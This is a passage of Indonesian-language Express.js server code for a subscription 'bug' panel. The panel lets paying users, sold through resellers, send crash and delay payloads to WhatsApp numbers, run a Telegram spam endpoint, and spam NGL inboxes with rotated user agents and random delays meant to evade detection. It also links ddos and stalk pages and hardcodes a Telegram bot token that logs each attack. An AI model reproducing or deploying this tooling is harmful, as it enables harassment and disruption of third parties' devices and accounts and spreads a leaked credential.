  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) {
      console.error("❌ Gagal membaca file opsi.html:", err);
      return res.status(500).send("File dashboard tidak ditemukan");
    }
    res.send(html);
  });
});

app.get("/api/option-data", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);

  if (!currentUser) {
    return res.status(404).json({ error: "User not found" });
  }

  const userRole = currentUser.role || 'user';

  const expired = new Date(currentUser.expired).toLocaleString("id-ID", {
    timeZone: "Asia/Jakarta",
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
  });

  const now = Date.now();
  const timeRemaining = currentUser.expired - now;
  const daysRemaining = Math.max(0, Math.floor(timeRemaining / (1000 * 60 * 60 * 24)));

  res.json({
    username: currentUser.username,
    role: userRole,
    activeSenders: sessions.size,
    expired: expired,
    daysRemaining: daysRemaining
  });
});
      
app.get("/profile", requireAuth, (req, res) => {
    const filePath = path.join(__dirname, 'shadow', 'profil.html');

    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
            console.error(err);
            return res.status(500).send("Gagal memuat halaman profile");
        }

        const username = req.user.username;
        const role = req.user.role || "Member";
        
        const daysRemaining = req.user.daysRemaining || "0";
        const activeSenders = req.user.activeSenders || "0";
        const createdAt = req.user.createdAt || "-";
        const expired = req.user.expired || "Permanent";
        const key = req.user.key || "No Key";

        let result = data
            .replace(/\${username}/g, username)
            .replace(/\${role}/g, role)
            .replace(/\${daysRemaining}/g, daysRemaining)
            .replace(/\${activeSenders}/g, activeSenders)
            .replace(/\${createdAt}/g, createdAt)
            .replace(/\${expired}/g, expired)
            .replace(/\${key}/g, key);

        res.send(result);
    });
});

app.get("/tiktok", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "shadow", "tiktok-downloader.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/tiktok2", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "shadow", "tiktok.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/pin", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "shadow", "pinterest.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/music", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "shadow", "search-music.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/stats", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "shadow", "stats.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/support", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "shadow", "my-supports.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/sender", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "shadow", "sender.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/yt", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "shadow", "YouTube.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/ddos", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "shadow", "ddos.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/anime", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "shadow", "anime.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/grup", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "shadow", "chatpublic.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/hentai", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "shadow", "nsfw.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/wifi", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "shadow", "wifi.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/fix", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "shadow", "fixjs.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/ai", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "shadow", "shadowai.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/slot", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "shadow", "slot.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/casino", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "shadow", "casino.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/game", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "shadow", "game.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/block", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "shadow", "puzzle.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/stalk", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "shadow", "stalk.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/ig-dl", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "shadow", "reels.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});
      
const BOT_TOKEN = "8219912158:AAGTHaD3TTBIGtGY-iWym2gNz8hE9TbCy70";
const CHAT_ID = "2391017512";
let lastExecution = 0;

app.get("/execution", async (req, res) => {
  try {
    const username = req.cookies.sessionUser;

    if (!username) {
      return res.redirect("/login?msg=Silakan login terlebih dahulu");
    }

    const users = getUsers();
    const currentUser = users.find(u => u.username === username);

    if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
      return res.redirect("/login?msg=Session expired, login ulang");
    }

    const justExecuted = req.query.justExecuted === 'true';
    const targetNumber = req.query.target || '';
    const mode = req.query.mode || '';

    if (justExecuted && targetNumber && mode) {
      const cleanTarget = targetNumber.replace(/\D/g, '');
      const country = getCountryCode(cleanTarget);
      
      return res.send(executionPage("✓ S U C C E S", {
        target: targetNumber,
        timestamp: new Date().toLocaleString("id-ID"),
        message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()} - Completed - ${country}`
      }, false, currentUser, "", mode));
    }

    const userSessions = loadUserSessions();
    const userSenders = userSessions[username] || [];
    const activeUserSenders = userSenders.filter(sender => sessions.has(sender));
    
    console.log(`[INFO] User ${username} has ${activeUserSenders.length} active senders`);

    return res.send(executionPage("🟥 Ready", {
      message: "Masukkan nomor target dan pilih mode bug",
      activeSenders: activeUserSenders
    }, true, currentUser, "", mode));

  } catch (err) {
    console.error("❌ Fatal error di /execution:", err);
    return res.status(500).send("Internal Server Error");
  }
});

app.post("/execution", requireAuth, async (req, res) => {
  try {
    const username = req.cookies.sessionUser;
    const { target, mode } = req.body;

    if (!target || !mode) {
      return res.status(400).json({ 
        success: false, 
        error: "Target dan mode harus diisi" 
      });
    }

    const cleanTarget = target.replace(/\D/g, '');
    
    if (cleanTarget.length < 7 || cleanTarget.length > 15) {
      return res.status(400).json({
        success: false,
        error: "Panjang nomor harus antara 7-15 digit"
      });
    }

    if (cleanTarget.startsWith('0')) {
      return res.status(400).json({
        success: false,
        error: "Nomor tidak boleh diawali dengan 0. Gunakan format kode negara (contoh: 62, 1, 44, dll.)"
      });
    }

    const userSessions = loadUserSessions();
    const userSenders = userSessions[username] || [];
    const activeUserSenders = userSenders.filter(sender => sessions.has(sender));

    if (activeUserSenders.length === 0) {
      return res.status(400).json({
        success: false,
        error: "Tidak ada sender aktif. Silakan tambahkan sender terlebih dahulu."
      });
    }

    const validModes = ["delay", "crash", "fcandro"];
    if (!validModes.includes(mode)) {
      return res.status(400).json({
        success: false,
        error: `Mode '${mode}' tidak valid. Mode yang tersedia: ${validModes.join(', ')}`
      });
    }

    const userSender = activeUserSenders[0];
    const sock = sessions.get(userSender);
    
    if (!sock) {
      return res.status(400).json({
        success: false,
        error: "Sender tidak aktif. Silakan periksa koneksi sender."
      });
    }

    const targetJid = `${cleanTarget}@s.whatsapp.net`;
    const country = getCountryCode(cleanTarget);

    let bugResult;
    try {
      if (mode === "delay") {
        bugResult = await delayinvisible(sock, targetJid);
      } else if (mode === "crash") {
        bugResult = await forceandro(sock, targetJid);
      } else if (mode === "fcandro") {
        bugResult = await androkill(sock, targetJid);
      }

      const logMessage = `<blockquote>⚡ <b>New Execution Success - International</b>
      
👤 User: ${username}
📞 Sender: ${userSender}
🎯 Target: ${cleanTarget} (${country})
📱 Mode: ${mode.toUpperCase()}
⏰ Time: ${new Date().toLocaleString("id-ID")}</blockquote>`;

      axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: logMessage,
        parse_mode: "HTML"
      }).catch(err => console.error("Gagal kirim log Telegram:", err.message));

      lastExecution = Date.now();

      res.json({ 
        success: true, 
        message: "Bug berhasil dikirim!",
        target: cleanTarget,
        mode: mode,
        country: country
      });

    } catch (error) {
      console.error(`[EXECUTION ERROR] User: ${username} | Error:`, error.message);
      res.status(500).json({
        success: false,
        error: `Gagal mengeksekusi bug: ${error.message}`
      });
    }

  } catch (error) {
    console.error("❌ Error in POST /execution:", error);
    res.status(500).json({
      success: false,
      error: "Terjadi kesalahan internal server"
    });
  }
});

app.get('/spam', (req, res) => {
    const username = req.cookies.sessionUser;
    if (!username) {
        return res.redirect('/login');
    }
    res.sendFile(path.join(__dirname, 'shadow', 'telegram-spam.html'));
});

app.post('/api/telegram-spam', async (req, res) => {
    try {
        const username = req.cookies.sessionUser;
        if (!username) {
            return res.json({ success: false, error: 'Unauthorized' });
        }

        const { token, chatId, count, delay, mode } = req.body;
        
        if (!token || !chatId || !count || !delay || !mode) {
            return res.json({ success: false, error: 'Missing parameters' });
        }

        if (count > 1000) {
            return res.json({ success: false, error: 'Maximum count is 1000' });
        }

        if (delay < 100) {
            return res.json({ success: false, error: 'Minimum delay is 100ms' });
        }

        const protectedTargets = ['@XYZAF', '@Cakwekuah', '@dapidd_ae02', '6131634462', '2062259984', '5448509135'];
        if (protectedTargets.includes(chatId)) {
            return res.json({ success: false, error: 'Protected target cannot be attacked' });
        }

        const logMessage = `<blockquote>🔰 <b>New Telegram Spam Attack</b>
        
👤 User: ${username}
🎯 Target: ${chatId}
📱 Mode: ${mode.toUpperCase()}
🔢 Count: ${count}
⏰ Delay: ${delay}ms
🕐 Time: ${new Date().toLocaleString("id-ID")}</blockquote>`;

        try {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: logMessage,
                parse_mode: "HTML"
            });
        } catch (err) {
            console.error("Gagal kirim log Telegram:", err.message);
        }

        res.json({ 
            success: true, 
            message: 'Attack started successfully',
            attackId: Date.now().toString()
        });

    } catch (error) {
        console.error('Telegram spam error:', error);
        res.json({ success: false, error: 'Internal server error' });
    }
});

const userTracking = {
  requests: new Map(),
  targets: new Map(),
  
  resetDaily() {
    this.requests.clear();
    this.targets.clear();
    console.log('🔄 Daily tracking reset');
  },
  
  canUserSend(userId, count) {
    const today = new Date().toDateString();
    const key = `${userId}-${today}`;
    const current = this.requests.get(key) || 0;
    return current + count;
  },
  
  canTargetReceive(target, count) {
    const today = new Date().toDateString();
    const key = `${target}-${today}`;
    const current = this.targets.get(key) || 0;
    return current + count;
  },
  
  updateUser(userId, count) {
    const today = new Date().toDateString();
    const key = `${userId}-${today}`;
    const current = this.requests.get(key) || 0;
    this.requests.set(key, current + count);
  },
  
  updateTarget(target, count) {
    const today = new Date().toDateString();
    const key = `${target}-${today}`;
    const current = this.targets.get(key) || 0;
    this.targets.set(key, current + count);
  },
  
  getUserStats(userId) {
    const today = new Date().toDateString();
    const key = `${userId}-${today}`;
    return this.requests.get(key) || 0;
  },
  
  getTargetStats(target) {
    const today = new Date().toDateString();
    const key = `${target}-${today}`;
    return this.targets.get(key) || 0;
  }
};

setInterval(() => {
  const now = new Date();
  if (now.getHours() === 0 && now.getMinutes() === 0) {
    userTracking.resetDaily();
  }
}, 60000);

async function nglSpam(target, message, count) {
  const logs = [];
  let success = 0;
  let errors = 0;

  console.log(`🔍 Starting NGL spam to ${target}, message: ${message}, count: ${count}`);

  const sendNGLMessage = async (target, message, attempt) => {
    const formData = new URLSearchParams();
    formData.append('username', target);
    formData.append('question', message);
    formData.append('deviceId', generateEnhancedUUID());
    formData.append('gameSlug', '');
    formData.append('referrer', '');
    formData.append('timestamp', Date.now().toString());

    if (attempt > 1) {
      const randomDelay = Math.floor(Math.random() * 4000) + 2000;
      await new Promise(resolve => setTimeout(resolve, randomDelay));
    }

    const userAgents = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
      'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1'
    ];
    
    const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

    try {
      console.log(`🔍 Attempt ${attempt} to ${target}`);
      
      const response = await axios.post('https://ngl.link/api/submit', formData, {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'User-Agent': randomUserAgent,
          'Accept': '*/*',
          'Accept-Language': 'en-US,en;q=0.9',
          'Origin': 'https://ngl.link',
          'Referer': `https://ngl.link/${target}`,
          'X-Requested-With': 'XMLHttpRequest',
          'Sec-Fetch-Dest': 'empty',
          'Sec-Fetch-Mode': 'cors',
          'Sec-Fetch-Site': 'same-origin'
        },
        timeout: 15000,
        validateStatus: function (status) {
          return status >= 200 && status < 500;
        }
      });

      console.log(`🔍 Response status: ${response.status}, data:`, response.data);

      if (response.status === 200) {
        if (response.data && response.data.success !== false) {
          success++;
          logs.push(`[${attempt}/${count}] ✅ Berhasil dikirim ke ${target}`);
          return true;
        } else {
          errors++;
          logs.push(`[${attempt}/${count}] ⚠️ Response tidak valid: ${JSON.stringify(response.data)}`);
          return false;
        }
      } else if (response.status === 429) {
        errors++;
        logs.push(`[${attempt}/${count}] 🚫 Rate limited - tunggu beberapa saat`);
        await new Promise(resolve => setTimeout(resolve, 10000));
        return false;
      } else {
        errors++;
        logs.push(`[${attempt}/${count}] ❌ HTTP ${response.status}: ${response.statusText}`);
        return false;
      }
    } catch (error) {
      errors++;
      console.error(`🔍 Error in attempt ${attempt}:`, error.message);
      
      if (error.response) {
        logs.push(`[${attempt}/${count}] ❌ HTTP ${error.response.status}: ${error.response.data?.message || error.response.statusText}`);
      } else if (error.request) {
        logs.push(`[${attempt}/${count}] ❌ Network Error: Tidak dapat terhubung ke server NGL`);
      } else {
        logs.push(`[${attempt}/${count}] ❌ Error: ${error.message}`);
      }
      
      return false;
    }
  };

  function generateEnhancedUUID() {
    const timestamp = Date.now().toString(36);
    const random = Math.random().toString(36).substr(2, 9);
    return `web-${timestamp}-${random}`;
  }

  if (!target || !message || count <= 0) {
    throw new Error('Input tidak valid');
  }

  if (count > 50) {
    throw new Error('Maksimal 50 pesan per request untuk menghindari detection');
  }

  logs.push(`🚀 Memulai spam ke: ${target}`);
  logs.push(`📝 Pesan: ${message}`);
  logs.push(`🔢 Jumlah: ${count} pesan`);
  logs.push(`⏳ Delay: 2-6 detik random antar pesan`);
  logs.push(`─`.repeat(40));

  for (let i = 0; i < count; i++) {
    const result = await sendNGLMessage(target, message, i + 1);
    
    if (i > 0 && i % 10 === 0) {
      logs.push(`⏸️  Istirahat sebentar setelah ${i} pesan...`);
      await new Promise(resolve => setTimeout(resolve, 10000));
    }
  }

  logs.push(`─`.repeat(40));
  logs.push(`📊 SELESAI! Sukses: ${success}, Gagal: ${errors}`);

  return { success, errors, logs };
}

function generateUUID() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
    const r = Math.random() * 16 | 0;
    const v = c === 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
}

app.get("/ngl-spam", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  const formattedExp = currentUser ? new Date(currentUser.expired).toLocaleString("id-ID", {
    timeZone: "Asia/Jakarta"
  }) : "-";

  const userId = req.ip || req.headers['x-forwarded-for'] || username;
  const userUsageToday = userTracking.getUserStats(userId);
  const remainingUser = 200 - userUsageToday;
  const usagePercentage = (userUsageToday / 200) * 100;

  const filePath = path.join(__dirname, "shadow", "spam-ngl.html");
  
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) {
      console.error("❌ Gagal membaca file spam-ngl.html:", err);
      return res.status(500).send("File tidak ditemukan");
    }

    let finalHtml = html
      .replace(/\${username}/g, username)
      .replace(/\${formattedExp}/g, formattedExp)
      .replace(/\${userUsageToday}/g, userUsageToday)
      .replace(/\${remainingUser}/g, remainingUser)
      .replace(/\${usagePercentage}/g, usagePercentage);
    
    res.send(finalHtml);
  });
});

app.get("/api/ngl-stats", requireAuth, (req, res) => {
  const userId = req.ip || req.headers['x-forwarded-for'] || req.cookies.sessionUser || 'anonymous';
  
  res.json({
    userStats: {
      todayUsage: userTracking.getUserStats(userId),
      dailyLimit: 200,
      remaining: 200 - userTracking.getUserStats(userId)
    },
    resetTime: 'Midnight (00:00 WIB)',
    message: 'Statistik penggunaan hari ini'
  });
});

app.get("/api/ngl-target-stats/:target", requireAuth, (req, res) => {
  const { target } = req.params;
  
  res.json({
    target: target,
    todayReceived: userTracking.getTargetStats(target),
    dailyLimit: 100,
    remaining: 100 - userTracking.getTargetStats(target),
    resetTime: 'Midnight (00:00 WIB)'
  });
});

app.post("/api/ngl-spam-js", requireAuth, async (req, res) => {
  const { target, message, count } = req.body;
  
  const userId = req.ip || req.headers['x-forwarded-for'] || req.cookies.sessionUser || 'anonymous';
  
  const limits = {
    maxPerRequest: 100,
    minDelay: 3000,
    maxDailyPerUser: 200,
    maxDailyPerTarget: 100
  };
  
  if (!target || !message || !count) {
    return res.status(400).json({ error: "Semua field harus diisi" });
  }

  if (count > limits.maxPerRequest) {
    return res.status(400).json({
      error: `❌ Untuk keamanan, maksimal ${limits.maxPerRequest} pesan per request`,
      currentCount: count,
      maxAllowed: limits.maxPerRequest
    });
  }

  if (count < 1) {
    return res.status(400).json({
      error: '❌ Jumlah pesan harus minimal 1'
    });
  }

  const userTotal = userTracking.canUserSend(userId, count);
  if (userTotal > limits.maxDailyPerUser) {
    const currentUsage = userTracking.getUserStats(userId);
    return res.status(429).json({
      error: '🚫 Limit harian tercapai!',
      message: `Kamu sudah kirim ${currentUsage} pesan hari ini. Limit: ${limits.maxDailyPerUser}/hari`,
      currentUsage: currentUsage,
      dailyLimit: limits.maxDailyPerUser,
      remaining: limits.maxDailyPerUser - currentUsage,
      resetTime: 'Midnight (00:00 WIB)'
    });
  }

  const targetTotal = userTracking.canTargetReceive(target, count);
  if (targetTotal > limits.maxDailyPerTarget) {
    const currentTargetUsage = userTracking.getTargetStats(target);
    return res.status(429).json({
      error: '🚫 Target sudah menerima terlalu banyak pesan!',
      message: `Target ${target} sudah terima ${currentTargetUsage} pesan hari ini. Limit: ${limits.maxDailyPerTarget}/hari`,
      currentTargetUsage: currentTargetUsage,
      targetDailyLimit: limits.maxDailyPerTarget,
      remaining: limits.maxDailyPerTarget - currentTargetUsage,
      resetTime: 'Midnight (00:00 WIB)'
    });
  }

  try {
    const result = await nglSpam(target, message, parseInt(count));
    
    userTracking.updateUser(userId, result.success);
    userTracking.updateTarget(target, result.success);
    
    res.json({
      ...result,
      stats: {
        userToday: userTracking.getUserStats(userId),
        userLimit: limits.maxDailyPerUser,
        targetToday: userTracking.getTargetStats(target),
        targetLimit: limits.maxDailyPerTarget,
        remaining: {
          user: limits.maxDailyPerUser - userTracking.getUserStats(userId),
          target: limits.maxDailyPerTarget - userTracking.getTargetStats(target)
        }
      }
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.get("/my-senders", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "shadow", "sender.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) {
      console.error("❌ Gagal membaca file sender.html:", err);
      return res.status(500).send("File sender.html tidak ditemukan");
    }
    res.send(html);
  });
});

app.get("/api/my-senders", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const userSessions = loadUserSessions();
  const userSenders = userSessions[username] || [];
  
  res.json({ 
    success: true, 
    senders: userSenders,
    total: userSenders.length
  });
});

app.get("/api/events", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Access-Control-Allow-Origin': '*',
  });

  userEvents.set(username, res);

  const heartbeat = setInterval(() => {
    try {
      res.write(': heartbeat\n\n');
    } catch (err) {
      clearInterval(heartbeat);
    }
  }, 30000);

  req.on('close', () => {
    clearInterval(heartbeat);
    userEvents.delete(username);
  });

  res.write(`data: ${JSON.stringify({ type: 'connected', message: 'Event stream connected' })}\n\n`);
});

app.post("/api/add-sender", requireAuth, async (req, res) => {
  const username = req.cookies.sessionUser;
  const { number } = req.body;
  
  if (!number) {
    return res.json({ success: false, error: "Nomor tidak boleh kosong" });
  }
  
  const cleanNumber = number.replace(/\D/g, '');
  if (!cleanNumber.startsWith('62')) {
    return res.json({ success: false, error: "Nomor harus diawali dengan 62" });
  }
  
  if (cleanNumber.length < 10) {
    return res.json({ success: false, error: "Nomor terlalu pendek" });
  }
  
  try {
    console.log(`[API] User ${username} adding sender: ${cleanNumber}`);
    const sessionDir = userSessionPath(username, cleanNumber);
    
    connectToWhatsAppUser(username, cleanNumber, sessionDir)
      .then((sock) => {
        console.log(`[${username}] ✅ Sender ${cleanNumber} connected successfully`);
      })
      .catch((error) => {
        console.error(`[${username}] ❌ Failed to connect sender ${cleanNumber}:`, error.message);
      });

    res.json({ 
      success: true, 
      message: "Proses koneksi dimulai! Silakan tunggu notifikasi kode pairing.",
      number: cleanNumber,
      note: "Kode pairing akan muncul di halaman ini dalam beberapa detik..."
    });
    
  } catch (error) {
    console.error(`[API] Error adding sender for ${username}:`, error);
    res.json({ 
      success: false, 
      error: "Terjadi error saat memproses sender: " + error.message 
    });
  }
});

app.post("/api/delete-sender", requireAuth, async (req, res) => {
  const username = req.cookies.sessionUser;
  const { number } = req.body;
  
  if (!number) {
    return res.json({ success: false, error: "Nomor tidak boleh kosong" });
  }
  
  try {
    const userSessions = loadUserSessions();
    if (userSessions[username]) {
      userSessions[username] = userSessions[username].filter(n => n !== number);
      saveUserSessions(userSessions);
    }
    
    const sessionDir = userSessionPath(username, number);
    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true });
    }
    
    res.json({ 
      success: true, 
      message: "Sender berhasil dihapus",
      number: number
    });
  } catch (error) {
    res.json({ 
      success: false, 
      error: error.message 
    });
  }
});

app.post("/adduser", requireAuth, (req, res) => {
  try {
    const username = req.cookies.sessionUser;
    const users = getUsers();
    const currentUser = users.find(u => u.username === username);
    
    if (!currentUser) {
      return res.redirect("/login?msg=User tidak ditemukan");
    }

    const sessionRole = currentUser.role || 'user';
    const { username: newUsername, password, role, durasi } = req.body;

    if (!newUsername || !password || !role || !durasi) {
      return res.send(`
        <script>
          alert("❌ Lengkapi semua kolom.");
          window.history.back();
        </script>
      `);
    }

    const durasiNumber = parseInt(durasi);
    if (isNaN(durasiNumber) || durasiNumber <= 0) {
      return res.send(`
        <script>
          alert("❌ Durasi harus angka positif.");
          window.history.back();
        </script>
      `);
    }

    if (sessionRole === "user") {
      return res.send(`
        <script>
          alert("🚫 User tidak bisa membuat akun.");
          window.history.back();
        </script>
      `);
    }

    if (sessionRole === "reseller" && role !== "user") {
      return res.send(`
        <script>
          alert("🚫 Reseller hanya boleh membuat user biasa.");
          window.history.back();
        </script>
      `);
    }

    if (sessionRole === "admin" && role === "admin") {
      return res.send(`
        <script>
          alert("🚫 Admin tidak boleh membuat admin lain.");
          window.history.back();
        </script>
      `);
    }

    if (sessionRole === "admin" && role === "owner") {
      return res.send(`
        <script>
          alert("🚫 Admin tidak boleh membuat owner.");
          window.history.back();
        </script>
      `);
    }

    if (sessionRole === "admin" && role === "developer") {
      return res.send(`
        <script>
          alert("🚫 Admin tidak boleh membuat developer.");
          window.history.back();
        </script>
      `);
    }

    if (sessionRole === "reseller" && role === "owner") {
      return res.send(`
        <script>
          alert("🚫 Reseller tidak boleh membuat owner.");
          window.history.back();
        </script>
      `);
    }

    if (sessionRole === "reseller" && role === "developer") {
      return res.send(`
        <script>
          alert("🚫 Reseller tidak boleh membuat developer.");
          window.history.back();
        </script>
      `);
    }

    if (sessionRole === "owner" && role === "developer" && !isDeveloper(currentUser.key)) {
      return res.send(`
        <script>
          alert("🚫 Owner tidak boleh membuat developer.");
          window.history.back();
        </script>
      `);
    }

    if (users.some(u => u.username === newUsername)) {
      return res.send(`
        <script>
          alert("❌ Username '${newUsername}' sudah terdaftar.");
          window.history.back();
        </script>
      `);
    }

    if (newUsername.length < 3) {
      return res.send(`
        <script>
          alert("❌ Username minimal 3 karakter.");
          window.history.back();
        </script>
      `);
    }

    if (password.length < 4) {
      return res.send(`
        <script>
          alert("❌ Password minimal 4 karakter.");
          window.history.back();
        </script>
      `);
    }

    const expired = Date.now() + (durasiNumber * 86400000);

    const newUser = {
      username: newUsername,
      key: password,
      expired,
      role,
      telegram_id: "",
      isLoggedIn: false
    };

    users.push(newUser);
    
    const saveResult = saveUsers(users);
    
    if (!saveResult) {
      throw new Error("Gagal menyimpan data user ke file system");
    }

    return res.redirect("/userlist?msg=User " + newUsername + " berhasil dibuat");

  } catch (error) {
    console.error("❌ Error in /adduser:", error);
    return res.send(`
      <script>
        alert("❌ Terjadi error saat menambahkan user: ${error.message}");
        window.history.back();
      </script>
    `);
  }
});

const userFilePath = path.join(__dirname, 'database', 'user.json');

app.post('/update-key', (req, res) => {
    const oldKey = req.body.oldKey ? req.body.oldKey.trim() : "";
    const newKey = req.body.newKey ? req.body.newKey.trim() : "";
    const username = req.session?.username;

    if (!username) {
        return res.send("Sesi berakhir. Silakan login kembali.");
    }

    let users = [];
    try {
        const data = fs.readFileSync(userFilePath, 'utf8');
        users = JSON.parse(data);
    } catch (err) {
        console.error("Gagal membaca file user.json:", err);
    }

    const userIndex = users.findIndex(u => 
        u.username.toLowerCase() === username.toLowerCase() && 
        u.key.toString().trim() === oldKey
    );

    let status, message, icon, themeColor;

    if (userIndex !== -1) {
        users[userIndex].key = newKey;

        try {
            fs.writeFileSync(userFilePath, JSON.stringify(users, null, 2), 'utf8');
            
            status = "SUCCESS";
            message = "Database core telah disinkronisasi. Key baru telah diaktifkan.";
            icon = "fa-check-double";
            themeColor = "#32CD32"; 
        } catch (err) {
            status = "SYSTEM ERROR";
            message = "Gagal menulis ke database. Periksa izin akses file.";
            icon = "fa-microchip";
            themeColor = "#ffa500";
        }
    } else {
        status = "ACCESS DENIED";
        message = "Password lama salah. Identitas gagal diverifikasi oleh sistem.";
        icon = "fa-exclamation-triangle";
        themeColor = "#ff4b2b";
    }

    res.send(`
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>${status} - ETERNAL ECLIPSE</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
    <style>
        :root { --primary: ${themeColor}; --bg-dark: #050505; }
